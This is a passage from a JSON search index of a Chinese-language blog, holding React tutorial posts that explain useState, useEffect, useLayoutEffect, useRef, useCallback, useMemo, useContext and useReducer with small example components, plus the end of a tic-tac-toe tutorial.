]; for (let i = 0; i &lt; lines.length; i++) { const [a, b, c] = lines[i]; if (squares[a] &amp;&amp; squares[a] === squares[b] &amp;&amp; squares[a] === squares[c]) { return squares[a]; } } return null;} 接著要在 &lt;Board /&gt; 每一次 re-render 後根據計算結果顯示對應的訊息： 123456789101112131415161718function Board() { const [squares, setSquares] = useState(Array(9).fill(null)); const [xIsNext, setXIsNext] = useState(true); // 每一次 re-render 就輸贏計算 const winner = calculateWinner(squares); // status 不再是 const，而是根據判斷結果來決定 let status; // 有分出勝負 if (winner) { status = `Winner is ${winner}`; } else if (!winner &amp;&amp; !squares.includes(null)) { status = `draw`; // 沒有贏家 &amp;&amp; 棋盤已經填滿了（都有值） } else { status = `Next player is ${xIsNext ? \"X\" : \"O\"}`; } // ...} 這邊做完後，會像這樣 確實能判斷輸贏了，不過同時也注意到會有個 bug，就是已經贏了卻還能繼續下棋，所以一開始才特別說其實有兩個時機點。 接著來處理第二個地方，在改變 state 以前的判斷。 12345678910111213141516function Board() { const [squares, setSquares] = useState(Array(9).fill(null)); const [xIsNext, setXIsNext] = useState(true); // 改變 state 以前 const handleChangeSquaresState = (i) =&gt; { // 計算輸贏 const winner = calculateWinner(squares); // 已經分出勝負 || 已經有值，就不往下執行 if (winner || squares[i]) return; const newSquares = squares.slice(); newSquares[i] = xIsNext ? \"X\" : \"O\"; setSquares(newSquares); setXIsNext(!xIsNext); };} 這樣子就能在正確的時機點停止遊戲了。 做到這邊，這個遊戲就已經完成囉，恭喜恭喜！ 最後附上完整的原始碼：Codesandbox","link":"/2022/04/15/react-tic-tac-toe-basic/"},{"title":"React 的第六個 hook：useCallback","text":"也是跟效能有關。 簡述 把 function 給記起來，如果 dependencies 沒有變，就不會重新宣告新的 function。 useCallback 說白話一點就是上面那樣子，它跟 useEffect 有點像，可以在第二個參數傳入 dependencies，告訴 react 只有在 dependencies 變的時候才幫我宣告新的 function，不然就沿用原本的就好。 接下來的範例會稍微複雜一點，所以先做段解說： 宣告兩個 function，一個會用 useCallback 一個不會。 利用 ref 來把一開始的 function 給記住 每次 re-render 時就跟一開始的 function 做比對 另外這邊一樣有用到 memo，所以要記得 memo 的特性是「當 props 改變時才會 re-render」。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566// 用來檢查是否相等的 functionconst checkIsEqual = (a, b) =&gt; a === b ? \"相等\" : \"不相等\";// 用 memo 記起來的 Componentconst Component = memo(props =&gt; { const counter = useRef(0); const message = props.isUseCallback ? \"有用 useCallback\" : \"沒有用 useCallback\"; counter.current++; return ( &lt;div&gt; {message} 的 component 已經被 render 了 {counter.current} 次 &lt;/div&gt; );});function App() { const [value, setValue] = useState(); // 只是個用來當作 dependencies 的 state const [someArg, setSomeArg] = useState(\"argument\"); // 用 useCallback，並把 dependencies 設為 someArg const handleSomethingUseCallback = useCallback(() =&gt; {}, [someArg]); // 沒有做額外設定 const handleSomething = () =&gt; {}; // 用 ref 把第一次的值記住，只要我們沒有自己去改值，它就不會變 const refHandleSomethingUseCallback = useRef(handleSomethingUseCallback); const refHandleSomething = useRef(handleSomething); // 處理 input 的 state const handleChange = (e) =&gt; setValue(e.target.value); return ( &lt;div className=\"app\"&gt; &lt;input type=\"text\" value={value} onChange={handleChange} /&gt; &lt;div&gt; 有用 useCallback 的比對結果： {checkIsEqual( refHandleSomethingUseCallback.current, handleSomethingUseCallback )} &lt;/div&gt; &lt;div&gt; 沒用 useCallback 的比對結果： {checkIsEqual( refHandleSomething.current, handleSomething )} &lt;/div&gt; &lt;Component isUseCallback={false} handleSomething={handleSomething} /&gt; &lt;Component isUseCallback={true} handleSomethingUseCallback={handleSomethingUseCallback} /&gt; &lt;/div&gt; );} 它的流程是這樣： 輸入文字，改變 value 的 state，觸發 re-render 沒有用 useCallback 的 function 會被重新宣告，所以 Compnonent 會被 re-render（因為 props 改變） 接著拿 useRef 存的值跟這次的 function 比對，得到 false 而有用 useCallback 的 function 因為 dependencies 沒有變（someArg），所以不會被重新宣告，也不會 re-render。而比對的部分也會是 true，因為 function 的值沒有改變。 useCallback 的用法就是這樣，不過最後要特別強調一件事情： 關於 useCallback 的 dependencies，一定要記得把 function 中有用到的依賴變數 or function 放進去，不然有可能會出現靈異現象（沒有重新宣告，所以拿不到最新的 state） 實際應用接著用一個實際案例來示範 useCallback 會用在什麼樣的地方。 一個最常見的例子是「串接 API」，最基本的 pattern 會長這樣： 12345useEffect(() =&gt; { fetch(...) .then(res =&gt; res.json()) .then(json =&gt; setList(json))}, []) 不過如果想用 async / await 的話就比較麻煩了，因為 useEffect 本身不可以直接用這個語法。第一種方式是直接宣告在裡面，像這樣： 12345678useEffect(() =&gt; { const getList = async () =&gt; { const res = await fetch(...) const json = await res.json() setList(json) } getList()}, []) 這樣子做沒什麼問題，唯一的缺點是可讀性不佳，所以我們通常會希望能宣告在外面，像這樣： 1234567891011function App () { const getList = async () =&gt; { const res = await fetch(...) const json = await res.json() setList(json) } useEffect(() =&gt; { getList() }, [])} 做到這邊以後，你就會發現 ESLint 很熱情地告訴你： 哈囉，你確定不要把 getList 這東西放到 dependencies 裡嗎？ 沒有想太多的你就乖乖照做了，結果就陷入「無窮迴圈」了 XD 這邊我不解釋太多，但主要的原因是因為「Reference」。 簡單來說就是每一次 re-render 時都會重新宣告 getList 這個 function，而每一次的 function 都會是不一樣的 function。 如果你不太懂的話，試著想想看這個例子大概就明白了： 123const a = () =&gt; {}const b = () =&gt; {}console.log(a === b) // ??? 所以這時候就輪到 useCallback 出場了，我們可以改寫成這樣子： 1234567891011function App () { const getList = useCallback(async () =&gt; { const res = await fetch(...) const json = await res.json() setList(json) }, []) useEffect(() =&gt; { getList() }, [getList])} 附註：這邊的 getList 因為沒有用到其他相關的 variable 或 state，所以 dependencies 是空的，也就是說不會被重新宣告。但如果你在實作時有這個需求，請務必記得加上去，避免出現非預期的結果。 useCallback 在這邊的任務就是「檢查 dependencies 有沒有變？」，如果沒有，就會回傳 cache 住的 function（就是原本的那個啦），反之則重新宣告一個新的 function。 既然現在 function 不會被重新宣告，那麼就可以把它填入 useEffect 的 dependencies 中，不會再進入無限迴圈囉！","link":"/2022/04/07/react-use-callback/"},{"title":"React 的第八個 hook：useContext 與 createContext","text":"感覺很實用的東西！ 先來認識 Props Drilling在介紹這兩個 hook 前可以先認識什麼是「Props Drilling」，這是一個在專案規模比較大的時候時一定會碰到的經典問題。 以前在寫 Vue 的時後好像就碰過類似的問題，就是當父元件要傳遞的 props 非常深的時候，code 會極其難看，來看個例子： 123456789101112131415161718192021222324import { useState } from \"react\";function DemoInnerButton({ setTitle }) { // 用 props 拿到的 function 改變 title return &lt;button onClick={() =&gt; setTitle(\"New title!\")}&gt;change title&lt;/button&gt;;}function DemoInnerContent({ setTitle }) { return &lt;DemoInnerButton setTitle={setTitle} /&gt;;}function DemoInner({ setTitle }) { return &lt;DemoInnerContent setTitle={setTitle} /&gt;;}export default function Demo() { const [title, setTitle] = useState(\"This is title\"); return ( &lt;div&gt; Title value is: {title} &lt;br /&gt; &lt;DemoInner setTitle={setTitle} /&gt; &lt;/div&gt; );} 簡單來說，Demo 有一個 title 的 state，現在想要在最底下的子元件 DemoInnerButton 按下按鈕時更新 state。 為了讓 DemoInnerButton 拿到 setTitle 的 setter，就得像這樣子一直往下傳： Demo 傳給 DemoInner DemoInner 傳給 DemoInnerContent DemoInnerContent 傳DemoInnerButton 這個操作就叫做「Props Drilling」，因為我們不停的往下「鑽」。 所以 React 就提供了兩個 hook useContext 和 createContext ，用來解決這個問題。 useContext 與 createContext來改寫剛剛的例子，先簡單說明用法： 建立一個 &lt;Context.provider /&gt;，可以想成是專門傳遞 Context 的一種 Component 在要子元件上從 Context 身上把需要的 props 拿進來 123456789101112131415161718192021222324252627282930313233import { useState, createContext, useContext } from \"react\";// 建立 Context Component// 查網路的資料是說可以傳入 props 的預設值，當使用 Provider 沒傳 value 時就會套用// 不過我實測沒效，不確定是版本問題還是有改規則，總之還是乖乖傳 value 吧！const TitleContext = createContext();function DemoInnerButton() { // 直接指定 Context 拿出 props const setTitle = useContext(TitleContext); return &lt;button onClick={() =&gt; setTitle(\"New title!\")}&gt;change title&lt;/button&gt;;}function DemoInnerContent() { return &lt;DemoInnerButton /&gt;;}function DemoInner() { return &lt;DemoInnerContent /&gt;;}function Demo() { const [title, setTitle] = useState(\"This is title\"); return ( {/* 在最外層包一層 Provider */} &lt;TitleContext.Provider value={setTitle}&gt; &lt;div&gt; Title value is: {title} &lt;br /&gt; &lt;DemoInner /&gt; &lt;/div&gt; &lt;/TitleContext.Provider&gt; );} 這樣子寫之後就不用再每一層都寫 props 了，非常方便！ OK，這樣確實解決了。不過有一個問題，「當父子元件沒有寫在同一支檔案裡的時候，子元件要怎麼存取 TitleContext？」 123456789101112131415161718192021222324252627import { useState, createContext, useContext } from \"react\";// 拆出去的子元件import DemoInnerButton from './DemoChild'// 寫在這裡的 Contextconst TitleContext = createContext();function DemoInnerContent() { return &lt;DemoInnerButton /&gt;;}function DemoInner() { return &lt;DemoInnerContent /&gt;;}export default function Demo() { const [title, setTitle] = useState(\"This is title\"); return ( &lt;TitleContext.Provider value={setTitle}&gt; &lt;div&gt; Title value is: {title} &lt;br /&gt; &lt;DemoInner /&gt; &lt;/div&gt; &lt;/TitleContext.Provider&gt; );} 問得好！我一開始也想過。不過解法還蠻直覺的，就是先把 Context 抽出去變成一支檔案，在 import 進來就好啦。（可以開一個 store 資料夾來存，資料很多的話） Context： 123import { createContext } from \"react\";// export 出去export const TitleContext = createContext(); 子元件： 12345678910import { useContext } from \"react\";// 引入 Context import { TitleContext } from \"./TitleContext\";export default function DemoInnerButton() { // 這邊就能拿到 Context 了 const setTitle = useContext(TitleContext); return &lt;button onClick={() =&gt; setTitle(\"New title!\")}&gt;change title&lt;/button&gt;;} 父元件： 12345678910111213141516171819202122232425import { useState } from \"react\";// 引入子元件import DemoInnerButton from './DemoChild'// 引入 Contextimport { TitleContext } from './TitleContext'function DemoInnerContent() { return &lt;DemoInnerButton /&gt;;}function DemoInner() { return &lt;DemoInnerContent /&gt;;}export default function Demo() { const [title, setTitle] = useState(\"This is title\"); return ( &lt;TitleContext.Provider value={setTitle}&gt; &lt;div&gt; Title value is: {title} &lt;br /&gt; &lt;DemoInner /&gt; &lt;/div&gt; &lt;/TitleContext.Provider&gt; );} 大功告成！可喜可賀！ 其他補充 Provider 裡面可以再包一層 Provider Provider 可以在某一層被覆寫（在某層又包一層同樣的 Provider value 可以傳任何東西，Array 或 Object 都行，然後接收者就會拿到對應的值。 可以透過 state 來動態更新 Provider 的 value","link":"/2022/04/08/react-use-context-and-use-context/"},{"title":"React 的第三個 hook：useEffect","text":"據說是最難理解的一個。 基本概念 React render 完，瀏覽器 paint 出畫面以後，你想做什麼？ 可以想成是 render 完以後的 callback function，你可以在裡面寫要做的事情。 一樣拿 todo list 來舉例，假設我希望有 localstorage 的功能，直覺的做法可能是這樣子： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// 因為 setTodos 是非同步的，所以沒辦法直接用 setItem(todos) 的方式來存// 而是要跟改 state 的方式一樣，產生一個新的 state 來存const setLocalStorage = (todos) =&gt; window.localStorage.setItem(\"todos\", JSON.stringify(todos));// 新增 todosconst handleAddTodo = (content) =&gt; { setTodos([ { id, content, isDone: false, }, ...todos, ]); // 更新 localstorage setLocalStorage([ { id, content, isDone: false, }, ...todos, ]); id++;};// 刪除 todosconst handleRemoveTodo = (id) =&gt; { setTodos(todos.filter((todo) =&gt; todo.id !== id)); // 更新 localstorage setLocalStorage(todos.filter((todo) =&gt; todo.id !== id));};// 編輯 todosconst handleToggleTodoState = (id) =&gt; { setTodos( todos.map((todo) =&gt; { if (todo.id !== id) return todo; return { ...todo, isDone: !todo.isDone }; }) ); // 更新 localstorage setLocalStorage( todos.map((todo) =&gt; { if (todo.id !== id) return todo; return { ...todo, isDone: !todo.isDone }; }) );}; 就是在每個會「改變 todos 的 state 的地方」都加上儲存紀錄的處理。不過這樣不就跟寫 Vanilla JS 沒兩樣了嗎？所以其實有更好的做法，就是透過 useEffect： 123useEffect(() =&gt; { window.localStorage.setItem('todos', JSON.stringify(todos));}); 對，就是這麼煞氣的用一行來輕輕鬆鬆解決。但重要的是要知道為什麼可以這樣做？ 這是因為 useEffect 的執行時間是在每一次 render 完以後才被執行。所以這整個流程是這樣子： 第一次載入，render 完以後，把目前 todo 的 state 儲存到 localStorage 新增一筆 todo，更新了 state，觸發 re-render 重新 render 完，把畫面 paint 出來後，再次執行 useEffect useEffect 根據目前 todo 的 state 把東西儲存到 localStorage 所以你知道原因了嗎？要 render 東西以前必須先有 state，而 useEffect 是在 render 完以後才被執行，那不就代表在 useEffect 裡的 state 一定是目前畫面上最新的狀態嗎？ 所以在這個時候去設定 storage 絕對不會出錯，而且也是個很不錯的時機。 關於 useEffect 的第二個參數，為什麼需要它？附註：這個參數叫做「dependencies」 假設一個 Component 中有多個 state，而在用 useEffect 時又沒有指定「第二個參數」，告訴 React 你要觀察哪個 state 的話，就會在任何 state 改變時都被觸發（因為 state 改變就會重新 render，重新 render 就會再次觸發一次 useEffect） 以剛剛 todo list 的例子來說，我的 component 中可能有 inputValue 跟 todos 這兩個 state。 現在當我輸入一個字就會觸發一次 useEffect，因為我修改了 inputValue 的 state，而 state 變了就會重新 render，重新 render 就會再執行一次 useEffect，像下圖這樣： 但怎麼看都不合理嘛！應該要在 todo 這個 state 有改變時再做儲存的動作就好，而不是在任何 state 改變都去儲存。 因此這就是第二個參數的用途，讓你指定哪一個 state 改變時才執行這個 useEffect（這邊是為了方便解釋才這樣說。精確一點的說法是根據 dependencies 的內容是否有變來決定，有變的話才會觸發 useEffect） 接著來改寫剛剛的範例： 12345useEffect(() =&gt; { console.log('儲存 todos') console.log('todos', todos) window.localStorage.setItem('todos', JSON.stringify(todos));}, [todos]); // 告訴它我只想要 todos 改變時才執行這個 effect 加上這個參數後就能確保只有在 todos 改變時才去觸發 useEffect，避免了剛剛的問題。 所以人家常說的一次式 useEffect只要你有弄懂剛剛的範例，就能明白為什麼下面這樣寫法只會執行一次： 123useEffect(() =&gt; { console.log('只會執行一次')}, []); 因為 dependencies（陣列裡面）的內容永遠都是空的，所以不論接下來發生什麼事情它都不會改變，當然就不會再次觸發。","link":"/2022/04/06/react-use-effect/"},{"title":"在 React 使用 fontawesome 的方法","text":"先貼著，有時間再來補。 簡述因為我現在懶的寫，所以先把 官方文件 貼在這。","link":"/2022/04/16/react-use-font-awesome/"},{"title":"React 的第四個 hook：useLayoutEffect","text":"生命週期的味道。 簡述 React render 完，瀏覽器 paint 之前，你想做什麼？ 一樣是 todo list 的範例，假設我在讀 loaclStorage 資料的時候是這樣寫的： 1234567891011121314151617181920212223242526272829function App() { // 預設的初始值 const [todos, setTodos] = useState([ { id: 0, content: \"吃飯\", isDone: true, }, { id: 1, content: \"寫文章\", isDone: false, }, { id: 2, content: \"寫程式\", isDone: false, }, ]); // storage 的資料 useEffect(() =&gt; { const todoData = window.localStorage.getItem(\"todos\") || \"\"; if (todoData) { setTodos(JSON.parse(todoData)); } }, []);} 這時候就會出現「閃一下」的問題，像這樣： （我電腦寫不出這種效果，可能是閃太快的關係吧，所以改貼 Lidemy 的影片內容） 這是因為執行順序是這樣： 第一次 render，瀏覽器 paint 初始值的 todos 執行 useEffect，讀取 loaclStorage，更新 todos 的 state state 變了所以再 render 一次，瀏覽器再 paint 成新的 todos 這就是為什麼會「閃一下」，因為 useEffect 是在瀏覽器 paint 完以後才會被執行的 hook，所以一開始會先顯示預設的 todos，接著執行 useEffect 時改了 state，而 state 改變後又重新 render 了一次畫面，最後顯示新的 todos。 可以參考這張圖，大概理解一下 hook 的生命週期 總之一定要知道 useEffect 是讚 paint 完以後才會被執行就對了。 回到一開始的問題，那要怎麼解決才好？ 從上面的圖你應該能注意到一個東西是「Run LayoutEffects」，看起來就是在說它是跑在「Browser paints screen」以前的 hook，那麼是不是用這個就可以解決了？ 沒錯，正是如此哦！ 123456useLayoutEffect(() =&gt; { const todoData = window.localStorage.getItem(\"todos\") || \"\"; if (todoData) { setTodos(JSON.parse(todoData)); }}, []); 改成這樣以後的執行順序就會變成： 第一次 render，進入瀏覽器 paint 以前的 hook 執行 useLayoutEffect，讀取 localStorage，更新 todos 的 state state 變了所以再 render 一次，瀏覽器再把 todos 給 paint 出來 因為是在瀏覽器把畫面 paint 出來以前就先更新了 state，所以原本的 state 在被 render 出來之前就被覆寫掉了，因此最後 paint 時才會是新的 state。（不懂的話就看著圖，想想看每一步的流程應該就會懂了）","link":"/2022/04/06/react-use-layout-effect/"},{"title":"React 的第七個 hook：useMemo","text":"還是跟效能有關。 簡述 把元件中的 function 的「回傳值」記住，只有 dependencies 改變時才會重新執行 function。 （或也不一定要是 function，只要是「複雜的求值運算」都可以包在 useMemo 裡面） 再強調一次，是元件中的 function 的「回傳值」，不要搞錯了。 這是通常用來避免子元件被 re-render 時，把原本不需要重新計算的的 function 又重新計算，造成耗費效能的問題。 直接來示範用法： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253// 第一個 componentconst ComponentWithoutUseMemo = () =&gt; { const counter = useRef(0); const myFunction = () =&gt; { // 如果重新執行的話，計數器就會遞增 counter.current++; return 1; }; const value = myFunction(); return ( &lt;div&gt; ComponentWithoutUseMemo 中的 function 已經被執行了 {counter.current}{\" \"} 次，回傳值為 {value} &lt;/div&gt; );};// 第二個 componentconst Component = () =&gt; { const counter = useRef(0); const myFunction = () =&gt; { // 如果重新執行的話，計數器就會遞增 counter.current++; return 1; }; // 用 useMemo 把回傳值記起來 // 這邊設定空的 dependencies，因為固定只會回傳 1 而已 const value = useMemo(() =&gt; { return myFunction(); }, []); return ( &lt;div&gt; Component 中的 function 已經被執行了 {counter.current} 次，回傳值為{\" \"} {value} &lt;/div&gt; );};function App() { const [value, setValue] = useState(); const handleChange = (e) =&gt; setValue(e.target.value); return ( &lt;div className=\"app\"&gt; &lt;input type=\"text\" value={value} onChange={handleChange} /&gt; &lt;ComponentWithoutUseMemo /&gt; &lt;Component /&gt; &lt;/div&gt; );}","link":"/2022/04/07/react-use-memo/"},{"title":"React 的第九個 hook：useReducer","text":"回來填坑。 簡述之前碰到這個 hook 時就想說等學完 Redux 再來詳細解說吧，結果一眨眼兩、三個月就過去了 XD，總之這篇要來解釋一下 useReducer 的用途。 我覺得當這個 hook 很適合用在「當你不需要用到 Redux，但又想要全域 state」的時候。可以利用它來跟 Context 結合出一個替代方案。 所以看這篇前最好先知道一下 useContext 在幹嘛？因為等一下的範例會用到，建議可以先去看我之前寫的這兩篇： React 的第八個 hook：useContext 與 createContext React－關於 useContext 更好的寫法 useReducer 的好用之處？「在學任何東西前，先問一下為什麼要用這個東西？」是句很經典的話，所以我們先來舉一個範例，一開始不使用 useReducer 接著再來解釋如果用了 useReducer 能帶來什麼好處？ 假設我們目前要做一個可以切換「顏色主題」的網頁，底下的元件得根據目前的主題來切換樣式，所以除了需要 state 以外，我們還需要一個 Context 來避免「Props drilling」的問題。 所以呢，目前大概會有這樣的 code： ThemeContext.jsx 12345678910111213141516import { createContext } from 'react'// 存取 context 時還是得透過他，所以要 export 出去export const ThemeContext = createContext()// 建立一個元件包裝後再 export 出去export function ThemeProvider ({ children }) { const [theme, setTheme] = useState({ color: 'dodgerblue' }) return ( &lt;ThemeContext.Provider value={{theme, setTheme}}&gt; {children} &lt;/ThemeContext.Provider&gt; )} 這個是在 React－關於 useContext 更好的寫法 中提到的小技巧，忘記的話可以去複習一下。 App.js 1234567891011import Nav from \"./Nav\";import \"./styles.css\";import { ThemeProvider } from \"./ThemeContext\";export default function App() { return ( &lt;ThemeProvider&gt; &lt;Nav /&gt; &lt;/ThemeProvider&gt; );} 接著，假設我們想透過導覽列上的按鈕來切換顏色，可能就會寫出這樣的東西： 12345678910111213141516import { useContext } from \"react\";import { ThemeContext } from \"./ThemeContext\";export default function Nav() { const { theme, setTheme } = useContext(ThemeContext); const changeTheme = () =&gt; setTheme((prevTheme) =&gt; ({ ...prevTheme, color: \"pink\" })); return ( &lt;div className=\"nav\" style={{ background: theme.color }}&gt; &lt;h1&gt;Peanu&lt;/h1&gt; &lt;button onClick={changeTheme}&gt;Change Theme&lt;/button&gt; &lt;/div&gt; ); 做到這邊有任何疑問的話可以先來這邊看一下範例，希望能幫助你理解一點。 總之呢，一個最簡單的 Context 就這樣完成了，但如果你仔細想一下會發現其實有可以改善的空間： 1. 邏輯全部塞在 function 裡我知道這聽起來有點奇怪，畢竟在 function 放邏輯不是天經地義的事嗎？不然要放在哪裡？ 別急，我的意思是指剛剛我們直接在 changeTheme 中用 setTheme 的這種方式其實應該有更好的寫法，畢竟當邏輯變得複雜時裡面的東西也會越來越多，可讀性就會沒那麼好。 這個時候如果我們可以透過 dispatch 的概念來改寫的話，不是會好很多嗎？像這樣： 123456function changeTheme () { dispatch({ type: 'CHANGE_COLOR', payload: 'pink' })} 2. state / function 零散各地意思是當 ThemeContext 想建立其他的 state 時，state 就會越來越多個，像這樣： 123456789101112131415161718192021222324import { createContext } from 'react'// 存取 context 時還是得透過他，所以要 export 出去export const ThemeContext = createContext()// 建立一個元件包裝後再 export 出去export function ThemeProvider ({ children }) { const [theme, setTheme] = useState({ color: 'dodgerblue' }) // 其他的 state const [state2, setState2] = useState() const [state3, setState3] = useState() return ( &lt;ThemeContext.Provider value={{ theme, setTheme, state2, state3 }}&gt; {children} &lt;/ThemeContext.Provider&gt; )} 所以呢，這時候如果改用 useReducer 的話就可以改善這些問題。 加入 useReducer這邊先介紹一下 useReducer 的用法，其實就跟在寫 redux 差不多，所以如果你對 redux 完全沒概念的話建議先去補一些相關知識再回來看，這邊不會解釋太深。 總之核心要素還是幾個東西： reducer action dispatch 首先 useReducer 會接收兩個參數，分別為 initialState 跟 reducer。 initialState 就是初始的 state，reducer 則是用來處理每個 action 的 function。 所以強調一下： reducer 就只是一個 function reducer 就只是一個 function reducer 就只是一個 function 接著 useReducer 會回傳兩個值（包在 Array 裡），分別為 state 跟 dispatch，前者就是 state 的值，後者則是用來發出 action 的一個 function。 其實這幾個東西都是 redux 的核心要素，所以再次建議你先去理解 redux 的概念後再回來看這篇，不然應該很難理解。 所以回到剛剛的例子，我們會把 useState 拿掉，改用 useReducer 來取代，變成這樣子： 12345678910111213141516171819202122232425262728293031323334353637import { createContext, useReducer } from \"react\";export const ThemeContext = createContext();// initialStateconst initState = { color: \"dodgerblue\"};// reducerconst themeReducer = (state, action) =&gt; { switch (action.type) { case \"CHANGE_THEME\": return { ...state, color: action.payload }; default: return state; }};export function ThemeProvider({ children }) { // 改用 useReducer 取代 useState const [state, dispatch] = useReducer(themeReducer, initState); // 用來改變 state 的 function const changeTheme = (color) =&gt; { dispatch({ type: \"CHANGE_THEME\", payload: color }); }; // 最後把 state 跟 changeTheme 當作 Provider 的值 return ( &lt;ThemeContext.Provider value={{ state, changeTheme }}&gt; {children} &lt;/ThemeContext.Provider&gt; );} 最後完成的 範例 在這邊，有什麼疑問的話可以去玩玩看。 回顧一下剛剛提到的兩個問題，這邊改用 useReducer 後其實就都解決了： 1. 邏輯都寫在 function 裡 現在 function 要做的事情很單純，就是 dispatch 一個 action 給 reducer，僅此而已。 2. 需要很多不同的 state 來管理不同狀態 當改用 useReducer 後，我們可以把所有 state 放在一個 Object 管理就好，不需要再拆成一個一個。 所以以上就是 useReducer 的範例，希望之後能運用這個輕量型的 hook 來實現簡單的狀態管理。","link":"/2022/06/20/react-use-reducer/"},{"title":"React 的第二個 hook：useRef","text":"再來一個。 懶人包以下是幾個很重要的特性： 回傳值是一個有 current 屬性的 Object 更新 current 值不會觸發 re-render re-render 的時後不會被重新賦值 這些是我覺得最重要的幾點，請務必弄清楚。 用來存取 Uncontrolled Component通常是用在 Uncontrolled Component（沒有 state 的 Component） 上，不過這邊為了方便會直接拿 &lt;input&gt; 來舉例（實務上通常會把 &lt;input&gt; 當成 controlled Component）： 1234567891011121314151617181920import { useRef } from 'react'function TodoHeader () { // 使用這個 hook const inputRef = useRef() const handleInput = (e) =&gt; { // 要透過 current 才能存取到（因為 pass-by-reference 的問題） console.log(inputRef.current.value) } return ( &lt;TodoHeaderWrapper onSubmit={handleSubmit}&gt; &lt;TodoInputBlock&gt; // 在這裡傳入 ref 這個 props &lt;Input ref={inputRef} value={value} onChange={handleInput}&gt;&lt;/Input&gt; &lt;BlueButton&gt;送出&lt;/BlueButton&gt; &lt;/TodoInputBlock&gt; &lt;/TodoHeaderWrapper&gt; )} 一開始的 inputRef 應該會是一個空物件 {current: null}（我猜的啦），接著當你把它當作 props 給 Component 的時候就會被變成那個 DOM 元素。 所以你才能在其他 function 中透過 inputRef 來抓到對應的 DOM 元素。 不希望 re-render 後被重新賦值有時候沒注意好的話可能就會犯這種錯： 123456789101112131415function App () { // 宣告一個 id let id = 1; // 為了觸發 re-render 而開的 state const [myState,setMyState] = useState(0) return ( &lt;div&gt;id: {id}&lt;/div&gt; &lt;div&gt;myState: {myState}&lt;/div&gt; // 點按鈕時就更新 state，並把 id++ &lt;button onClick={() =&gt; { setMyState(myState + 1) id++ }}&gt;Increment id&lt;/button&gt; )} 這邊碰到的問題是怎麼 id++ 沒用？ 原來是因為每次 re-render 的時候又會執行到 let id = 1 這段，這樣就等於又重新賦值了，所以結果還是會顯示 1，而不是遞增後的值。 要解決這個問題有兩種做法，一種是把 let id = 1 宣告在 Component 的外面，這樣 re-render 時就不會重新宣告一次。 另一種作法是用 useRef 來處理： 1234567891011121314function App () { const id = useRef(1); // { current : 1 } // 為了觸發 re-render 而開的 state const [myState,setMyState] = useState(0) return ( &lt;div&gt;id: {id.current}&lt;/div&gt; &lt;div&gt;myState: {myState}&lt;/div&gt; // 點按鈕時就更新 state，並把 id++ &lt;button onClick={() =&gt; { setMyState(myState + 1) id.current++ }}&gt;Increment id&lt;/button&gt; )} 雖然 re-render 的時候看起來好像會再執行一次 const id = useRef(1)，不過 useRef 的特性就是會把值給保留起來，所以實際上是不會被重新賦值的。 只有像 id.current++ 這種「自己去改變數值」的情況下它的值才會改變。 所以 useRef 就有點像是 useEffect 的顛倒過來。一個不能直接改值，一個可以；而一個在改值後會 re-render， 一個不會。","link":"/2022/04/06/react-use-ref/"},{"title":"React 的第一個 hook：useState","text":"是第一個也是最經典的？ 基本用法1234567function Counter() { const [value, setValue] = useState(1) const handleClick = () =&gt; setValue(value + 1) return &lt;button onClick={handleClick}&gt;{value}&lt;/button&gt;}ReactDOM.render(&lt;Counter /&gt;, document.getElementById('root')) useState() 的回傳值是一個 Array，第一個值是初始值，第二值是一個 function，當更新 state 時就會透過它來更新。 另外要特別注意，useState()（hook）只能寫在 component 裡面，寫在外面會出錯。 接著在講下面的東西之前，先記住這張圖，等一下會用到： （Notes 也稍微看一下，它有解釋什麼是 Update 和 Lazy Initializers） 初始值可以傳一個 function：Lazy Initializers拿 todo list 來舉例，假設我想把初始值設為 localStorage 中的內容，可能會這樣寫： 1234// 沒值的話會是 nullconst todoData = window.localStorage.getItem('todos')// null || []const [todos, setTodos] = useState(JSON.parse(todoData) || []) 這樣子做的結果是 OK 的，不過有一個問題是每次 render 的時候都會再跑一次 window.localStorage.getItem(\"todos\") 這段。 簡單來說，這會造成效能上的浪費，因為 useState 的初始值並不會因為下次 window.localStorage.getItem(\"todos\") 抓到的值改變而重新設定一次初始值，它只有在第一次載入時才會執行一次而已。 所以「如果初始值是需要經過計算的值」，可以直接在 useState 中改傳一個 function，像這樣： 1234567891011// 傳一個 function 進去const [todos, setTodos] = useState(() =&gt; { let todoData = window.localStorage.getItem('todos') if (todoData &amp;&amp; todoData !== '[]') { todoData = JSON.parse(todoData) id = todoData[0].id + 1 } else { todoData = [] } return todoData}) 這種作法在技術上會稱為「Lazy Initializers」。 總而言之，這樣做以後就不會出現每次 render 又重複執行的問題。（或也可以說是降低 side effect 吧？聽起來比較專業的說法） 當在 function 裡面回傳另一個 function：Cleanup Effects在用 useEffect 中使用 function 來設定初始值的時候，其實裡面還可以在回傳一個 function，這個 function 會是「Cleanup Effects」階段的 hook： 12345678910// 更新 localStorageuseEffect(() =&gt; { console.log('Effect todos', todos) window.localStorage.setItem('todos', JSON.stringify(todos)) // 回傳另一個 function return () =&gt; { // 這裡會拿到上一個 todos 的值 console.log('Clean Effect todos', todos) }}, [todos]) 這個 Cleanup Effects hook 會在下一次執行 useEffect 之前先被執行，就跟一開始那張圖裡畫的一樣。而且特別的地方是它能拿到上一個 state 的值，參考下圖： 解說一下這流程： 第一次 render 完後執行 useEffect，印出空陣列 第二次新增了 todo，改變了 state，重新 render Component render 完以後，執行 cleanup effect，這裡的值會是上一個 effect 的 state，所以會印出空陣列 cleanup effect 執行完後，接著才執行 useEffect，印出新的 todo state（有一個 todo 的內容） 這個 hook 可能會用在你需要清除前一個狀態的時候會用到，例如 webSocket 之類的（先刪除上一筆使用者的連結，才接著建立新的連結）。 或者是希望在 unMount 以前做某些事情，大概會像這樣： 1234567useEffect(() =&gt; { ... // unMount 階段要做的事 return () =&gt; { ... }}, []) 這個原理是因為傳入空值（dependencies）的useEffect 只有在第一次載入的時候會被執行，要執行第二次的機會只會出現在元件要被 unMount 的時候，這時候才有辦法觸發裡面的 cleanup Effect。 如果新的 state 需要用上一個 state 來算，可以在 setter 傳入 function如標題所述，這邊我就直接寫個簡短的範例： 12345678910const [squares, setSquares] = useState(Array(9).fill(null))const handleClick = () =&gt; { setSquares((prev) =&gt; { // 拿到上一個 state console.log('prev state', prev) // return 的東西就變成新的 state return [...prev, Math.random()] })};&lt;button onClick={handleClick}&gt;Click&lt;/button&gt; 初始值是裝了 9 個 null 的空陣列，每當點按鈕時就加一筆亂數到後面去，結果會像這樣子： 